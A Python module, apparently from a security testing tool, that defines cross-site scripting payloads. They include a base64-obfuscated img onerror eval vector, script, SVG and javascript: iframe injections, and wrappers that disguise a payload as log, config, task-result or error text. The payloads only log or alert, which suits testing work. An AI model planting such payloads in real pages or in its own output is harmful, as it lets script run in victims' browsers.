"""XSS payload definitions and generators."""

import base64
from dataclasses import dataclass
from typing import List


@dataclass
class XSSPayload:
    """Represents an XSS payload with metadata."""
    
    id: str
    type: str
    content: str
    vector: str
    description: str = ""


def get_default_payloads() -> List[XSSPayload]:
    """
    Get the default XSS payloads for testing.
    
    Returns:
        List of XSSPayload objects
    """
    # Base64 encoding of: console.log("11223344")
    b64_payload = base64.b64encode(b'console.log("11223344")').decode()
    
    # Primary XSS payload - img tag with base64 encoded JavaScript
    primary_payload = f'"><img src=x id={b64_payload} onerror=eval(atob(this.id))>'
    
    payloads = [
        XSSPayload(
            id="xss_001",
            type="img-onerror-base64",
            content=primary_payload,
            vector="all",
            description="Primary XSS payload with base64 encoded console.log"
        ),
        XSSPayload(
            id="xss_002",
            type="script-tag",
            content='<script>console.log("XSS_TEST")</script>',
            vector="files",
            description="Basic script tag injection"
        ),
        XSSPayload(
            id="xss_003",
            type="event-handler",
            content='<img src=x onerror=alert("XSS")>',
            vector="files",
            description="Image onerror event handler"
        ),
        XSSPayload(
            id="xss_004",
            type="svg-injection",
            content='<svg onload=alert("XSS")>',
            vector="files",
            description="SVG onload injection"
        ),
        XSSPayload(
            id="xss_005",
            type="iframe-injection",
            content='<iframe src="javascript:alert(\'XSS\')">',
            vector="files",
            description="Iframe JavaScript protocol"
        ),
    ]
    
    return payloads


def get_contextual_payloads(base_payload: str) -> List[XSSPayload]:
    """
    Generate contextual variations of a base payload.
    
    Args:
        base_payload: The base XSS payload string
        
    Returns:
        List of XSSPayload objects with different contexts
    """
    contexts = [
        ("log", f"[SYSTEM LOG] {base_payload}"),
        ("analysis", f"[ANALYSIS] {base_payload}"),
        ("event", f"Event: {base_payload}"),
        ("config", f"[Config] Value={base_payload}"),
        ("json", f'{{"data":"{base_payload}"}}'),
        ("diagnostic", f"[DIAGNOSTIC] {base_payload}"),
        ("security", f"SECURITY: {base_payload}"),
        ("task", f"Task Result: {base_payload}"),
        ("validation", f"Validation: {base_payload}"),
        ("error", f"ERROR: {base_payload}"),
    ]
    
    payloads = []
    for idx, (ctx_type, content) in enumerate(contexts, start=1):
        payloads.append(XSSPayload(
            id=f"ctx_{idx:03d}",
            type=f"contextual-{ctx_type}",
            content=content,
            vector="all",
            description=f"XSS payload with {ctx_type} context"
        ))
    
    return payloads
